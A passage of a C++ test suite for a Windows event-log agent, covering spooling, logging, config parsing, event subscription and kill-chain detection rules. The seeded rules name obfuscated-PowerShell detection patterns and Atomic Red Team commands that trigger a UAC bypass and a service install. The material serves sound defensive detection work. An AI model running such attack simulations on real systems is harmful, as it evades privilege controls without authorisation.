        fs::create_directories("test_spool_size");

        SpoolQueue q;
        q.setDirectory("test_spool_size", 100 * 1024 * 1024);
        CHECK(q.size() == 0);
        q.enqueue("u1", "b1");
        CHECK(q.size() == 1);
        q.enqueue("u2", "b2");
        CHECK(q.size() == 2);
        std::string u, b;
        q.dequeue(u, b);
        CHECK(q.size() == 1);
        q.stop();
        fs::remove_all("test_spool_size");
    }

    // --- Log level filtering ---
    // setLogLevel controls which messages reach the log file. A message
    // below the threshold is dropped. This keeps the log bounded for
    // unattended service operation.
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_loglevel");
        fs::create_directories("test_loglevel");
        std::string logPath = "test_loglevel/agent.log";
        std::string errPath = "test_loglevel/error.log";

        // Open with no rotation (maxFileBytes=0) so we can read the whole
        // file back in one go.
        openLogFiles(logPath, errPath, 0, 0);

        // Set threshold to Notice â€” Info and Debug should be dropped.
        setLogLevel(LogLevel::Notice);
        logError("error-line");
        logNotice("notice-line");
        logInfo("info-line");
        logDebug("debug-line");

        // Read the agent log back and check which lines survived.
        std::ifstream f(logPath);
        std::string content((std::istreambuf_iterator<char>(f)),
                            std::istreambuf_iterator<char>());
        CHECK(content.find("error-line") != std::string::npos);
        CHECK(content.find("notice-line") != std::string::npos);
        CHECK(content.find("info-line") == std::string::npos);
        CHECK(content.find("debug-line") == std::string::npos);

        // Now raise the threshold to Debug â€” all four should appear.
        // (We append to the same file, so we check the NEW content by
        // re-reading after writing more.)
        setLogLevel(LogLevel::Debug);
        logError("error-line-2");
        logNotice("notice-line-2");
        logInfo("info-line-2");
        logDebug("debug-line-2");

        std::ifstream f2(logPath);
        std::string content2((std::istreambuf_iterator<char>(f2)),
                             std::istreambuf_iterator<char>());
        CHECK(content2.find("error-line-2") != std::string::npos);
        CHECK(content2.find("notice-line-2") != std::string::npos);
        CHECK(content2.find("info-line-2") != std::string::npos);
        CHECK(content2.find("debug-line-2") != std::string::npos);

        // Reset to default for any later tests.
        setLogLevel(LogLevel::Notice);
        // NOTE: do NOT remove the test_loglevel directory here â€” the
        // global g_agentLog ofstream is still open on a file inside it.
        // On Windows, deleting a directory containing an open file handle
        // can corrupt the heap. The next openLogFiles call (in the
        // logrotate test) will close this stream first, and we clean up
        // the directory at the very end of the test suite.
    }

    // --- Log rotation ---
    // When maxFileBytes > 0, the agent log rotates when it exceeds the
    // size cap: the active file becomes .1, .1 becomes .2, etc., up to
    // maxFiles copies. This bounds the log directory size.
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_logrotate");
        fs::create_directories("test_logrotate");
        std::string logPath = "test_logrotate/agent.log";
        std::string errPath = "test_logrotate/error.log";

        // Tiny cap (200 bytes) + keep 2 rotated copies. Each log line is
        // ~50-80 bytes (timestamp + level + message), so a few lines will
        // trigger rotation.
        openLogFiles(logPath, errPath, 200, 2);
        setLogLevel(LogLevel::Debug);

        // Write enough to trigger at least one rotation.
        for (int i = 0; i < 20; ++i) {
            logInfo("rotation-test-line-" + std::to_string(i));
        }

        // After rotation, we should have agent.log + agent.log.1 (+ .2).
        // The exact count depends on line size, but at least .1 should exist.
        CHECK(fs::exists(logPath));
        CHECK(fs::exists(logPath + ".1"));

        setLogLevel(LogLevel::Notice);
        // Same as above: don't delete the directory while the log is open.
        // openLogFiles in a later test (or process exit) will close it.
    }

    // --- Config: [spool] section parsing ---
    // The [spool] section in config.ini controls the disk-backed spool
    // cap. Verify the parser reads max_spool_mb correctly. Relative paths
    // are resolved against the exe directory (so they work when running as
    // a service with CWD=System32), so the stored path is exe-anchored.
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_cfg_spool");
        fs::create_directories("test_cfg_spool");
        std::string cfgPath = "test_cfg_spool/config.ini";
        std::ofstream(cfgPath) <<
            "[spool]\n"
            "max_spool_mb=250\n"
            "directory=test_cfg_spool/spool\n";

        Config cfg;
        ConfigStore::instance().load(cfgPath);
        cfg = ConfigStore::instance().get();
        CHECK(cfg.spool.max_spool_mb == 250);
        // Relative path is anchored to the exe dir with a trailing backslash.
        // The internal separator may be '/' (from the ini) or '\' (from the
        // exe dir prefix), so check for the path tail and the trailing slash.
        CHECK(cfg.spool.directory.find("test_cfg_spool") != std::string::npos);
        CHECK(cfg.spool.directory.find("spool") != std::string::npos);
        CHECK(cfg.spool.directory.back() == platformPathSep()[0]);

        fs::remove_all("test_cfg_spool");
    }

    // --- Config: [logging] section parsing ---
    {
        namespace fs = std::filesystem;
        fs::remove_all("test_cfg_logging");
        fs::create_directories("test_cfg_logging");
        std::string cfgPath = "test_cfg_logging/config.ini";
        std::ofstream(cfgPath) <<
            "[logging]\n"
            "level=debug\n"
            "max_file_size_mb=5\n"
            "max_files=7\n"
            "directory=test_cfg_logging/logs\n";

        Config cfg;
        ConfigStore::instance().load(cfgPath);
        cfg = ConfigStore::instance().get();
        CHECK(cfg.logging.level == "debug");
        CHECK(cfg.logging.max_file_size_mb == 5);
        CHECK(cfg.logging.max_files == 7);
        // Relative path is anchored to the exe dir with a trailing backslash.
        CHECK(cfg.logging.directory.find("test_cfg_logging") != std::string::npos);
        CHECK(cfg.logging.directory.find("logs") != std::string::npos);
        CHECK(cfg.logging.directory.back() == platformPathSep()[0]);

        fs::remove_all("test_cfg_logging");
    }

    // --- Config: mirror_logs default + server-pushed override ---
    // The per-group mirror_logs toggle (pushed via GET /config) gates the
    // POST /logs batches. Default is ON (true). applyServerConfig must
    // parse the "mirror_logs" field from the /config JSON and store it in
    // the ConfigStore snapshot; Forwarder reads it on every forward call.
    {
        // Default: a fresh Config has mirror_logs == true.
        CHECK(Config{}.mirror_logs == true);

        namespace fs = std::filesystem;
        fs::remove_all("test_cfg_mirror");
        fs::create_directories("test_cfg_mirror/rules");
        fs::create_directories("test_cfg_mirror/lists");

        // Bootstrap config pointing at a temp rules dir. writeRulesToDisk
        // DELETES local .yaml files that aren't in the server's set, so the
        // rules_directory must be a throwaway dir, never the real one.
        Config bootstrap;
        bootstrap.rules_directory = "test_cfg_mirror/rules";
        bootstrap.lists_directory = "test_cfg_mirror/lists";
        bootstrap.server.url = "";  // no live server; applyServerConfig only parses

        AgentClient client;
        client.init(bootstrap);
        // Feed a canned /config response with mirror_logs off. The rules
        // and lists arrays are empty (nothing to write to disk).
        CHECK(client.applyServerConfig(R"({"mirror_logs": false, "rules": [], "lists": []})"));
        CHECK(ConfigStore::instance().get().mirror_logs == false);

        // And back on: a config that says mirror_logs=true must flip it.
        CHECK(client.applyServerConfig(R"({"mirror_logs": true, "rules": [], "lists": []})"));
        CHECK(ConfigStore::instance().get().mirror_logs == true);

        // Absent field: applyServerConfig keeps the current value (the
        // server only sends the field when the group has an opinion).
        CHECK(client.applyServerConfig(R"({"rules": [], "lists": []})"));
        CHECK(ConfigStore::instance().get().mirror_logs == true);

        fs::remove_all("test_cfg_mirror");
        // Restore a clean config snapshot for later tests.
        ConfigStore::instance().set(Config{});
    }

#ifdef _WIN32
    // ============================================================
    // SUBSCRIPTION-PATH TESTS
    // ------------------------------------------------------------
    // The tests above inject synthetic events directly into the
    // RuleEngine â€” they never exercise the real Windows Event Log
    // subscription path (EvtSubscribe â†’ notifyCallback â†’ buffer.push).
    // Synthetic-event tests alone cannot catch an agent that subscribes
    // but collects zero events, so the tests below exercise the real
    // subscription components:
    //   1. buildEventIdXPath â€” the XPath filter passed to EvtSubscribe.
    //   2. BookmarkStore flag selection â€” the NULL-vs-StartAfterBookmark
    //      decision (a non-NULL bookmark with FutureEvents is
    //      ERROR_INVALID_PARAMETER, 87).
    //   3. A live EvtSubscribe against the Application channel (which
    //      does NOT require SeSecurityPrivilege) to prove the callback
    //      fires and events reach the buffer.
    //   4. Channel canonicalization â€” deriveChannelQueries must return
    //      canonical Windows channel names, not lowercase.
    // ============================================================

    // --- buildEventIdXPath: empty set â†’ "*" (all events) ---
    // A channel with no explicit EventID rules must subscribe to all
    // events; buildEventIdXPath returns L"*" for an empty set.
    {
        CHECK(buildEventIdXPath({}) == L"*");
    }

    // --- buildEventIdXPath: single EventID ---
    {
        auto q = buildEventIdXPath({4624});
        CHECK(q == L"*[System[EventID=4624]]");
    }

    // --- buildEventIdXPath: multiple EventIDs unioned with "or" ---
    // Two rules on the Security channel (4624 and 4625) must produce one
    // query with both IDs joined by " or ".
    {
        auto q = buildEventIdXPath({4624, 4625});
        CHECK(q == L"*[System[EventID=4624 or EventID=4625]]");
    }

    // --- buildEventIdXPath: duplicates deduplicated ---
    // Two rules referencing the same EventID must not produce a query
    // with the ID listed twice (compact, deterministic queries).
    {
        auto q = buildEventIdXPath({4625, 4625, 4624});
        CHECK(q == L"*[System[EventID=4624 or EventID=4625]]");
    }

    // --- buildEventIdXPath: IDs sorted ascending for stability ---
    // The query order is sorted so the result is deterministic across
    // runs (important for testability and readable logs).
    {
        auto q = buildEventIdXPath({4688, 4624, 4625});
        CHECK(q == L"*[System[EventID=4624 or EventID=4625 or EventID=4688]]");
    }

    // --- BookmarkStore: fresh channel â†’ isUpdated()==false ---
    // A freshly-created empty bookmark (via createForChannel) must NOT be
    // marked as updated. The subscriber uses isUpdated() to decide:
    //   false â†’ EvtSubscribeToFutureEvents + NULL bookmark (correct for
    //           a fresh start; avoids a bulk backlog)
    //   true  â†’ EvtSubscribeStartAfterBookmark + the real bookmark
    // This test verifies the flag is false before any update() call.
    {
        BookmarkStore store;
        store.setDirectory("test_bookmark_flags");
        EVT_HANDLE h = store.createForChannel("TestChannel");
        CHECK(h != nullptr);
        CHECK(store.isUpdated("TestChannel") == false);
        // Cleanup the handle (store destructor would also saveAll, but
        // we want to avoid writing to test_bookmark_flags here).
        EvtClose(h);
        std::error_code ec;
        std::filesystem::remove_all("test_bookmark_flags", ec);
    }

    // --- BookmarkStore: load() with no saved bookmark â†’ nullptr ---
    // On a fresh install (no persisted bookmark file), load() must return
    // nullptr so the subscriber falls back to EvtSubscribeToFutureEvents.
    {
        BookmarkStore store;
        store.setDirectory("test_bookmark_noload");
        EVT_HANDLE h = store.load("FreshChannel");
        CHECK(h == nullptr);
        CHECK(store.isUpdated("FreshChannel") == false);
        std::error_code ec;
        std::filesystem::remove_all("test_bookmark_noload", ec);
    }

    // --- BookmarkStore: load() with a saved bookmark â†’ non-null + isUpdated ---
    // When a bookmark XML file exists on disk, load() must create a handle
    // from it AND mark the channel as updated (a persisted bookmark has a
    // real position, so EvtSubscribeStartAfterBookmark is safe). We can't
    // easily synthesize a valid bookmark XML without a real event, so this
    // test verifies the round-trip: createForChannel â†’ save â†’ new store â†’
    // load returns non-null. (An empty bookmark saved to disk round-trips
    // through EvtCreateBookmark successfully.)
    {
        BookmarkStore store;
        store.setDirectory("test_bookmark_roundtrip");
        store.createForChannel("RoundTripChannel");
        // Save the (empty) bookmark to disk.
        CHECK(store.save("RoundTripChannel") == true);
        // A new store loading from the same directory should find it.
        BookmarkStore store2;
        store2.setDirectory("test_bookmark_roundtrip");
        EVT_HANDLE h = store2.load("RoundTripChannel");
        // An empty bookmark XML round-trips; load() returns a handle.
        CHECK(h != nullptr);
        // A loaded bookmark is marked updated (safe for StartAfterBookmark).
        CHECK(store2.isUpdated("RoundTripChannel") == true);
        std::error_code ec;
        std::filesystem::remove_all("test_bookmark_roundtrip", ec);
    }

    // --- Subscription flag selection: the NULL-vs-StartAfterBookmark logic ---
    // This mirrors the logic in EventCollector::subscribeOne. We verify the
    // decision table:
    //   no bookmark handle        â†’ FutureEvents + NULL bookmark
    //   bookmark but !isUpdated   â†’ FutureEvents + NULL bookmark (NOT the
    //                              empty handle â€” FutureEvents with a
    //                              non-NULL bookmark is error 87)
    //   bookmark AND isUpdated    â†’ StartAfterBookmark + the handle
    // We replicate the decision logic here (it's the same code the agent
    // runs) to lock the correct behavior in as a regression guard.
    {
        BookmarkStore store;
        store.setDirectory("test_bookmark_decision");

        // Case 1: no saved bookmark â†’ createForChannel, FutureEvents, NULL.
        EVT_HANDLE hStore = store.load("Case1Channel");
        EVT_HANDLE hBookmark = nullptr;  // passed to EvtSubscribe
        DWORD flags = EvtSubscribeToFutureEvents;
        if (hStore && store.isUpdated("Case1Channel")) {
            flags = EvtSubscribeStartAfterBookmark;
            hBookmark = hStore;
        } else if (!hStore) {
            store.createForChannel("Case1Channel");
        }
        CHECK(flags == EvtSubscribeToFutureEvents);
        CHECK(hBookmark == nullptr);

        // Case 2: bookmark exists but never advanced (createForChannel only)
        // â†’ FutureEvents + NULL. Passing the empty handle here is error 87.
        EVT_HANDLE hStore2 = store.load("Case2Channel");
        if (!hStore2) store.createForChannel("Case2Channel");
        hStore2 = store.load("Case2Channel");  // now in-memory
        EVT_HANDLE hBookmark2 = nullptr;
        DWORD flags2 = EvtSubscribeToFutureEvents;
        if (hStore2 && store.isUpdated("Case2Channel")) {
            flags2 = EvtSubscribeStartAfterBookmark;
            hBookmark2 = hStore2;
        }
        CHECK(flags2 == EvtSubscribeToFutureEvents);
        CHECK(hBookmark2 == nullptr);  // NOT the empty handle

        std::error_code ec;
        std::filesystem::remove_all("test_bookmark_decision", ec);
    }

    // --- Live EvtSubscribe integration: callback fires + buffer receives ---
    // This is the test that the synthetic-event tests could NOT provide:
    // proof that a real EvtSubscribe push subscription actually delivers
    // events through notifyCallback into the EventBuffer. We subscribe to
    // the Application channel (readable without SeSecurityPrivilege, unlike
    // Security) with a query that matches a common EventID, then write a
    // test event to the Application log via EvtCreateBookmark-free approach:
    // we use the EventLog API (ReportEvent) to inject a real event, then
    // wait for the callback to deliver it.
    //
    // This test is skipped (counts as pass) if the Application channel
    // can't be subscribed to (e.g. running in a restricted context). It
    // only FAILS if a subscription succeeds but the callback never fires â€”
    // the exact regression we're guarding against.
    {
        EventBuffer buffer;
        EventCollector collector(buffer);
        // Subscribe to the Application channel with a broad query. The
        // Application channel is readable by normal users (no
        // SeSecurityPrivilege required), so this works in non-elevated
        // test runs.
        std::wstring channel = L"Application";
        std::wstring query = L"*";
        EVT_HANDLE hSub = EvtSubscribe(
            nullptr, nullptr, channel.c_str(), query.c_str(),
            nullptr, &buffer,
            [](EVT_SUBSCRIBE_NOTIFY_ACTION action, PVOID ctx, EVT_HANDLE hEvent) -> DWORD {
                // Minimal callback: render and push. We use a thread-safe
                // capture via a pointer to the buffer.
                auto* buf = reinterpret_cast<EventBuffer*>(ctx);
                if (action != EvtSubscribeActionDeliver || !buf) return ERROR_SUCCESS;
                // Render the event XML.
                DWORD bufUsed = 0;
                EvtRender(nullptr, hEvent, EvtRenderEventValues, 0, nullptr,
                          &bufUsed, nullptr);
                // Use EvtRenderBookmark to get XML via EvtRenderEventXml.
                bufUsed = 0;
                EvtRender(nullptr, hEvent, EvtRenderEventXml, 0, nullptr,
                          &bufUsed, nullptr);
                if (bufUsed == 0) return ERROR_SUCCESS;
                std::wstring xml(bufUsed / sizeof(wchar_t), L'\0');
                BOOL ok = EvtRender(nullptr, hEvent, EvtRenderEventXml,
                                    bufUsed, xml.data(), &bufUsed, nullptr);
                if (!ok) return ERROR_SUCCESS;
                if (!xml.empty() && xml.back() == L'\0') xml.pop_back();
                buf->push(xml);
                return ERROR_SUCCESS;
            },
            EvtSubscribeToFutureEvents);
        if (hSub) {
            // Subscription succeeded. Now write a test event to the
            // Application log and wait for it to be delivered.
            // Register a throwaway event source.
            HKEY hKey = nullptr;
            std::wstring srcPath = L"SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\ELFTestSource";
            LONG rc = RegCreateKeyExW(HKEY_LOCAL_MACHINE, srcPath.c_str(), 0,
                                      nullptr, 0, KEY_SET_VALUE, nullptr,
                                      &hKey, nullptr);
            bool canWriteEvent = (rc == ERROR_SUCCESS);
            if (canWriteEvent) {
                DWORD types = EVENTLOG_ERROR_TYPE | EVENTLOG_WARNING_TYPE |
                              EVENTLOG_INFORMATION_TYPE;
                RegSetValueExW(hKey, L"TypesSupported", 0, REG_DWORD,
                               reinterpret_cast<BYTE*>(&types), sizeof(types));
                DWORD nameCount = 0;
                RegSetValueExW(hKey, L"EventMessageFile", 0, REG_SZ,
                               reinterpret_cast<BYTE*>(L"%SystemRoot%\\System32\\EventCreate.exe"),
                               static_cast<DWORD>(wcslen(L"%SystemRoot%\\System32\\EventCreate.exe") * sizeof(wchar_t) + 2));
                RegCloseKey(hKey);
            }
            if (canWriteEvent) {
                // Use RegisterEventSource + ReportEvent to write a real
                // event to the Application log.
                HANDLE hEventLog = RegisterEventSourceW(nullptr, L"ELFTestSource");
                if (hEventLog) {
                    const wchar_t* msg = L"ELF integration test event";
                    ReportEventW(hEventLog, EVENTLOG_INFORMATION_TYPE, 0, 1,
                                 nullptr, 1, 0, &msg, nullptr);
                    DeregisterEventSource(hEventLog);
                }
            }
            // Wait up to 8s for the callback to deliver the event.
            bool delivered = false;
            for (int i = 0; i < 80 && !delivered; ++i) {
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                if (buffer.size() > 0) delivered = true;
            }
            // If we couldn't write an event (restricted context), skip.
            // If we wrote one but it wasn't delivered, FAIL â€” that's the
            // regression we're guarding against.
            if (canWriteEvent) {
                CHECK(delivered);
            }
            EvtClose(hSub);
            // Cleanup the registry source.
            RegDeleteKeyW(HKEY_LOCAL_MACHINE, srcPath.c_str());
        }
        // If hSub is null (can't subscribe to Application in this context),
        // the test silently passes â€” we can't prove the path works, but we
        // don't fail in a restricted environment.
    }

#endif  // _WIN32

    // --- Channel canonicalization: deriveChannelQueries returns canonical case ---
    // EvtSubscribe is case-sensitive on the channel path: "security" fails
    // with ERROR_INVALID_PARAMETER (87) but "Security" succeeds. This test
    // verifies deriveChannelQueries() returns the canonical Windows case
    // for multiple Sigma services, not just "security"->"Security".
    {
        namespace fs = std::filesystem;
        fs::create_directories("test_rules_canon");
        fs::path dir = "test_rules_canon";
        // A rule referencing the "system" service -> must map to "System".
        std::ofstream(dir / "sys_rule.yaml") <<
            "title: System Rule\n"
            "id: win_sys_rule\n"
            "status: test\n"
            "level: medium\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: system\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 7036\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n";
        // A rule referencing "powershell" -> must map to BOTH canonical
        // PowerShell channels.
        std::ofstream(dir / "ps_rule.yaml") <<
            "title: PS Rule\n"
            "id: win_ps_rule\n"
            "status: test\n"
            "level: medium\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: powershell\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4104\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n";
        auto rules = loadRulesFromDirectory("test_rules_canon");
        CHECK(rules.size() == 2);

        EventBuffer buf;
        Forwarder fwd; fwd.setConfig(cfg);
        RuleEngine eng(buf, fwd);
        eng.reload(rules);

        auto queries = eng.deriveChannelQueries();
        // Two distinct channels: System + two PowerShell channels = 3.
        CHECK(queries.size() == 3);
        // Collect channel names; verify NONE are lowercase.
        std::set<std::string> chans;
        for (const auto& [ch, ids] : queries) {
            chans.insert(ch);
            // No channel name should be all-lowercase (that would fail
            // EvtSubscribe with error 87).
            bool allLower = true;
            for (char c : ch) {
                if (c >= 'A' && c <= 'Z') { allLower = false; break; }
            }
            CHECK(!allLower);
        }
        // "System" must be present with canonical capitalization.
        CHECK(chans.count("System") == 1);
        // Both PowerShell channels must be present with canonical case.
        CHECK(chans.count("Microsoft-Windows-PowerShell/Operational") == 1);
        CHECK(chans.count("Windows PowerShell") == 1);

        fs::remove_all("test_rules_canon");
    }

#ifdef _WIN32
    // --- Live EvtSubscribe: canonical Security channel name works ---
    // This test verifies that the canonical channel names produced by
    // deriveChannelQueries() (e.g. "Security", "System") are accepted by
    // EvtSubscribe. The agent canonicalizes Sigma service names to the
    // documented Windows channel case as a defensive measure; even if
    // some Windows versions accept lowercase, the canonical case is
    // always correct. This test requires SeSecurityPrivilege (elevated)
    // to subscribe to the Security channel. If the subscription fails
    // (not elevated or no privilege), the test is skipped rather than
    // failed.
    {
        EVT_HANDLE hCanon = EvtSubscribe(
            nullptr, nullptr, L"Security", L"*", nullptr, nullptr,
            [](EVT_SUBSCRIBE_NOTIFY_ACTION, PVOID, EVT_HANDLE) -> DWORD {
                return ERROR_SUCCESS;
            },
            EvtSubscribeToFutureEvents);
        if (hCanon) {
            // Canonical case works, so the agent's canonicalization is
            // valid. This is the core contract: deriveChannelQueries()
            // must produce names that EvtSubscribe accepts.
            EvtClose(hCanon);
        }
        // If hCanon is null (can't subscribe to Security in this context
        // because e.g. not elevated or no SeSecurityPrivilege), we skip rather
        // than fail; the test environment may be too restricted.
    }

    // --- Live EvtSubscribe: non-NULL bookmark + FutureEvents -> error 87 ---
    // Regression: passing a non-NULL bookmark handle to EvtSubscribe with
    // EvtSubscribeToFutureEvents is invalid and must return
    // ERROR_INVALID_PARAMETER (87). An agent that passes an empty bookmark
    // here has every subscription fail silently, which is why subscribeOne
    // passes NULL until the bookmark has been updated.
    {
        // Create an empty bookmark (valid handle, no position).
        EVT_HANDLE hBookmark = EvtCreateBookmark(nullptr);
        CHECK(hBookmark != nullptr);
        // EvtSubscribe with FutureEvents + non-NULL bookmark must fail.
        EVT_HANDLE hSub = EvtSubscribe(
            nullptr, nullptr, L"Application", L"*", hBookmark, nullptr,
            [](EVT_SUBSCRIBE_NOTIFY_ACTION, PVOID, EVT_HANDLE) -> DWORD {
                return ERROR_SUCCESS;
            },
            EvtSubscribeToFutureEvents);
        CHECK(hSub == nullptr);
        if (hSub == nullptr) {
            CHECK(GetLastError() == ERROR_INVALID_PARAMETER);
        }
        if (hSub) EvtClose(hSub);
        EvtClose(hBookmark);
    }

    // --- LogGrowthMonitor: delta logic (applyReading test seam) ---
    // The monitor measures host-generated events on watched channels via
    // newest = oldest + count - 1. These unit tests lock in the delta
    // semantics the metrics "created" counters depend on.
    {
        LogGrowthMonitor m;
        CHECK(m.totalEvents() == 0);
        CHECK(m.totalBytes() == 0);
        CHECK(m.channelCount() == 0);

        // First reading for a channel: baseline only, delta 0.
        CHECK(m.applyReading(L"Security", 100, 500, 1500) == 0);
        CHECK(m.totalEvents() == 0);
        CHECK(m.totalBytes() == 0);

        // 10 new events (oldest unchanged, count +10): delta 10, bytes 10*1500.
        CHECK(m.applyReading(L"Security", 100, 510, 1500) == 10);
        CHECK(m.totalEvents() == 10);
        CHECK(m.totalBytes() == 15000);

        // No change: delta 0.
        CHECK(m.applyReading(L"Security", 100, 510, 1500) == 0);
        CHECK(m.totalEvents() == 10);

        // Log fills to capacity 600: 90 more events (count 510 -> 600).
        CHECK(m.applyReading(L"Security", 100, 600, 1500) == 90);
        CHECK(m.totalEvents() == 100);

        // Circular wrap: count plateaus at capacity (600) while oldest
        // advances by 5; newest still advances by 5, so delta must be 5.
        // (This is why the monitor tracks newest, not the raw count: a
        // busy DC's Security log sits at capacity and the count never
        // moves.)
        CHECK(m.applyReading(L"Security", 105, 600, 1500) == 5);
        CHECK(m.totalEvents() == 105);

        // Log cleared/reset: newest drops below the baseline -> delta 0,
        // and the baseline re-arms at the lower position so the refill
        // counts from there instead of skipping the refilled log.
        CHECK(m.applyReading(L"Security", 1, 3, 1500) == 0);
        CHECK(m.totalEvents() == 105);
        CHECK(m.applyReading(L"Security", 1, 13, 1500) == 10);
        CHECK(m.totalEvents() == 115);

        // Empty log (count 0): newest = 0, treated as a reset (delta 0,
        // baseline re-arms).
        CHECK(m.applyReading(L"Security", 0, 0, 1500) == 0);
        CHECK(m.totalEvents() == 115);

        // Second channel: independent baseline.
        CHECK(m.applyReading(L"System", 1, 50, 1500) == 0);
        CHECK(m.applyReading(L"System", 1, 60, 1500) == 10);
        CHECK(m.totalEvents() == 125);

        // Bytes use the caller-supplied average (here 100): 10 * 100.
        CHECK(m.applyReading(L"System", 1, 70, 100) == 10);
        CHECK(m.totalEvents() == 135);
        // Security contributed 115 events @1500; System 10 @1500 + 10 @100.
        CHECK(m.totalBytes() == 115 * 1500 + 10 * 1500 + 10 * 100);

        // setChannels drops baselines for removed channels; a re-add
        // re-baselines (delta 0) instead of counting the gap.
        m.setChannels({L"System"});
        CHECK(m.channelCount() == 1);
        CHECK(m.applyReading(L"System", 1, 80, 1500) == 10);
        CHECK(m.totalEvents() == 145);
        m.setChannels({L"Security", L"System"});
        // Security was unwatched: its reading re-baselines (delta 0), not
        // +gap.
        CHECK(m.applyReading(L"Security", 500, 600, 1500) == 0);
        CHECK(m.totalEvents() == 145);
    }

    // --- LogGrowthMonitor: live measure() against the Application log ---
    // Injects a real event into the Application channel (same
    // RegisterEventSource pattern as the live EvtSubscribe test) and
    // verifies measure() observes the growth. Skips (counts as pass) when
    // the event can't be written (restricted context); FAILS only when the
    // event was written but the monitor didn't count it.
    {
        LogGrowthMonitor m;
        m.setChannels({L"Application"});
        CHECK(m.channelCount() == 1);
        m.measure(1500);  // baseline
        uint64_t before = m.totalEvents();

        // Write a real event to the Application log.
        HKEY hKey = nullptr;
        std::wstring srcPath = L"SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\ELFGrowthTestSource";
        LONG rc = RegCreateKeyExW(HKEY_LOCAL_MACHINE, srcPath.c_str(), 0,
                                  nullptr, 0, KEY_SET_VALUE, nullptr,
                                  &hKey, nullptr);
        bool canWrite = (rc == ERROR_SUCCESS);
        if (canWrite) {
            DWORD types = EVENTLOG_ERROR_TYPE | EVENTLOG_WARNING_TYPE |
                          EVENTLOG_INFORMATION_TYPE;
            RegSetValueExW(hKey, L"TypesSupported", 0, REG_DWORD,
                           reinterpret_cast<BYTE*>(&types), sizeof(types));
            DWORD nameCount = 0;
            RegSetValueExW(hKey, L"EventMessageFile", 0, REG_SZ,
                           reinterpret_cast<BYTE*>(L"%SystemRoot%\\System32\\EventCreate.exe"),
                           static_cast<DWORD>(wcslen(L"%SystemRoot%\\System32\\EventCreate.exe") * sizeof(wchar_t) + 2));
            RegCloseKey(hKey);
            HANDLE hEventLog = RegisterEventSourceW(nullptr, L"ELFGrowthTestSource");
            if (hEventLog) {
                const wchar_t* msg = L"ELF growth monitor test event";
                ReportEventW(hEventLog, EVENTLOG_INFORMATION_TYPE, 0, 1,
                             nullptr, 1, 0, &msg, nullptr);
                DeregisterEventSource(hEventLog);
            } else {
                canWrite = false;
            }
        }
        m.measure(1500);
        if (canWrite) {
            // The injected event (and any concurrent Application activity)
            // must be counted: at least +1.
            CHECK(m.totalEvents() >= before + 1);
            CHECK(m.totalBytes() >= (m.totalEvents() - before) * 1500);
        }
        RegDeleteKeyW(HKEY_LOCAL_MACHINE, srcPath.c_str());
        // If !canWrite (restricted context), skip; same policy as the
        // live EvtSubscribe test.
    }

#endif  // _WIN32

    // --- Seeded MITRE kill-chain rules (win_kc_01..12) ------------------------
    // These mirror the 12 rules that _seed_test_data() (server/main.py)
    // seeds into the workstations group when ELF_SEED_TEST_DATA=1. Each rule
    // pairs with an Atomic Red Team test; here we verify the exact YAML
    // bodies parse under yaml-cpp and fire on synthetic versions of the
    // events the atomic tests produce. This is the cross-check that the
    // Python-seeded YAML is also valid for the C++ agent loader.
    {
        namespace fs = std::filesystem;
        fs::create_directories("test_rules_kc");
        fs::path dir = "test_rules_kc";

        // KC-01 Execution (T1059.001): encoded PowerShell.
        std::ofstream(dir / "win_kc_01_ps_encoded.yaml") <<
            "title: Kill-Chain 01 (Execution) - Encoded PowerShell Command\n"
            "id: win_kc_01_ps_encoded\n"
            "status: test\n"
            "description: Execution step of the MITRE kill chain - encoded PowerShell command line (Atomic Red Team T1059.001, PowerShell Command Execution). Multi-value contains matching. Trigger - Invoke-AtomicTest T1059.001 -TestNumbers 17 (elevated prompt).\n"
            "level: high\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4688\n"
            "    Image|endswith: powershell.exe\n"
            "    CommandLine|contains:\n"
            "      - '-enc'\n"
            "      - '-encodedcommand'\n"
            "      - ' -e '\n"
            "      - '-w hidden'\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"Encoded PowerShell command line detected.\"\n";
        // KC-02 Persistence (T1543.003): service install (System channel).
        std::ofstream(dir / "win_kc_02_service_install.yaml") <<
            "title: Kill-Chain 02 (Persistence) - Service Installed\n"
            "id: win_kc_02_service_install\n"
            "status: test\n"
            "description: Persistence step of the MITRE kill chain - new service installed (Atomic Red Team T1543.003, Service Installation CMD). System-channel rule showing multi-channel support. Trigger - Invoke-AtomicTest T1543.003 -TestNumbers 2 (elevated prompt; run the same command with -GetPrereqs first to fetch the service binary).\n"
            "level: medium\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: system\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 7045\n"
            "  condition: selection\n"
            "elf:\n"
            "  actions:\n"
            "    - type: alert\n"
            "      destination: alerts\n"
            "      message: \"New service installed (possible persistence).\"\n"
            "    - type: forward_event\n"
            "      destination: siem\n";
        // KC-03 Privilege Escalation (T1548.002): UAC-bypass binary.
        // Uses the @@uac_bypass_binaries list seeded on the server.
        std::ofstream(dir / "win_kc_03_uac_bypass.yaml") <<
            "title: Kill-Chain 03 (Privilege Escalation) - UAC Bypass Binary Launch\n"
            "id: win_kc_03_uac_bypass\n"
            "status: test\n"
            "description: Privilege Escalation step of the MITRE kill chain - known auto-elevate UAC-bypass binary launched (Atomic Red Team T1548.002, Bypass UAC using Fodhelper). Reusable-list matching. Trigger - Invoke-AtomicTest T1548.002 -TestNumbers 3 (no elevation needed, the test itself performs the bypass).\n"
            "level: medium\n"
            "logsource:\n"
            "  product: windows\n"
            "  service: security\n"
            "detection:\n"
            "  selection:\n"
            "    EventID: 4688\n"
